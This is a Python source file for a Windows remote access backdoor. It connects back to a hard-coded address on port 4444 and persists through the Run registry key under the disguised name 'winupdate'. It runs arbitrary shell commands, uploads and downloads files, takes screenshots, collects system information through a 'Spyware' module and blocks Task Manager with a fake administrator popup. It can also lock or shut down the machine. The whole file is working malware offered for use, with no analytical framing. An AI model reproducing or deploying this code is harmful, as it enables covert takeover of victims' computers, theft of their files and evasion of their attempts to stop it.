import os
import sys
import json
import time
import ctypes
import socket
import base64
import Spyware
import datetime
import pyautogui
import subprocess
from winreg import *
from shutil import copyfile

class Backdoor:
    PATH = os.path.realpath(sys.argv[0])
    TMP = os.environ["TEMP"]
    APPDATA = os.environ["APPDATA"]

    should_disable_tm = True

    def __init__(self, ip, port):
        self.connect(ip, port)

    def connect(self, ip, port):
        while True:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((ip, port))
            except socket.error:
                time.sleep(5)
            else:
                break

    def startup(self, onstartup):
        try:
            str_app_path = os.path.join(self.APPDATA, os.path.basename(self.PATH))
            if not os.getcwd() == self.APPDATA:
                copyfile(self.PATH, str_app_path)

            obj_reg_key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
            SetValueEx(obj_reg_key, "winupdate", 0, REG_SZ, str_app_path)
            CloseKey(obj_reg_key)
        except WindowsError:
            if not onstartup:
                return "[-] Unable to add to Startup."
        else:
            if not onstartup:
                return "[+] Added to Startup successfully."

    def remove_from_startup(self):
        try:
            obj_reg_key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
            DeleteValue(obj_reg_key, "winupdate")
            CloseKey(obj_reg_key)
        except FileNotFoundError:
            return "[-] Program is not registered in Startup."
        except WindowsError:
            return "[-] Error removing value."
        else:
            return "[+] Removed from Startup successfully."

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing directory to: ".format(path)

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    def vbs_block_process(self, process, popup=False):
        strVBSCode = "On Error Resume Next\n" + \
                    "Set objWshShl = WScript.CreateObject(\"WScript.Shell\")\n" + \
                    "Set objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!//./root/cimv2\")\n" + \
                    "Set colMonitoredProcesses = objWMIService.ExecNotificationQuery(\"select * " \
                    "from __instancecreationevent \" & \" within 1 where TargetInstance isa 'Win32_Process'\")\n" + \
                    "Do" + "\n" + "Set objLatestProcess = colMonitoredProcesses.NextEvent\n" + \
                    f"If LCase(objLatestProcess.TargetInstance.Name) = \"{process}\" Then\n" + \
                    "objLatestProcess.TargetInstance.Terminate\n"
        if popup:
            strVBSCode += f'objWshShl.Popup "{popup[0]}", {popup[2]}, "{popup[1]}", {popup[3]}\n'

        strVBSCode += "End If\nLoop"
        strScript = os.path.join(self.TMP, "d.vbs")

        with open(strScript, "w") as objVBSFile:
            objVBSFile.write(strVBSCode)

        subprocess.Popen(["cscript", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                        shell=True)

    def change_state_task_manager(self):
        global should_disable
        if not self.should_disable_tm:
            subprocess.Popen(["taskkill", "/f", "/im", "cscript.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE, shell=True)

            self.should_disable_tm = True
            return "[+] Task Manager Enabled."
        else:
            popup = ["Task Manager has been disabled by your administrator", "Task Manager", "3", "16"]

            self.vbs_block_process("taskmgr.exe", popup=popup)
            self.should_disable_tm = False
            return "[+] Task Manager Disabled."

    def take_screenshot(self):
        try:
            myScreenshot = pyautogui.screenshot()
            current_path = os.path.abspath(os.getcwd())
            current_time = datetime.datetime.now()

            file_name = "\{}-{}-{}-{}-{}.jpg".format(current_time.month, current_time.day, current_time.hour, current_time.minute, current_time.second)
            myScreenshot.save(current_path + file_name)
            self.reliable_send("[+] Successfully managed to save the Screenshot.")
        except Exception:
            self.reliable_send("[-] Screenshot failed to save.")

    def get_system_info(self):
        try:
            spyware = Spyware.spyware()
            return spyware.report()
        except Exception:
            return "[-] Unable to get System Information."

    def lock_system(self):
        try:
            ctypes.windll.user32.LockWorkStation()
            return "[+] Locked the System."
        except Exception:
            return "[-] Unable to Lock the System."

    def shutdown_system(self, shutdowntype):
        command = f"shutdown {shutdowntype} -f"
        subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
        
        self.connection.close()
        sys.exit(0)
        
    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "e" or command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "d":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "u":
                    command_result = self.write_file(command[1], command[2])
                elif command[0] == "s":
                    command_result = self.take_screenshot()
                elif command[0] == "si":
                    command_result = self.get_system_info()
                elif command[0] == "tm":
                    command_result = self.change_state_task_manager()
                elif command[0] == "st":
                    command_result = self.startup(False)
                elif command[0] == "rst":
                    command_result = self.remove_from_startup()
                elif (command[0] == "cs" or command[0] == "changestate") and command[1] == "1":
                    command_result = self.lock_system()
                elif (command[0] == "cs" or command[0] == "changestate") and command[1] == "2":
                    command_result = self.shutdown_system("-r")
                elif (command[0] == "cs" or command[0] == "changestate") and command[1] == "3":
                    command_result = self.shutdown_system("-s")
                else:
                    command_result = self.execute_system_command(command).decode()
            except socket.error:
                self.connection.close()
                self.connect()
            except Exception as e:
                command_result = "[-] Error during command execution: {}".format(e)
 
            self.reliable_send(command_result)

try:
    my_backdoor = Backdoor("192.168.19.1", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()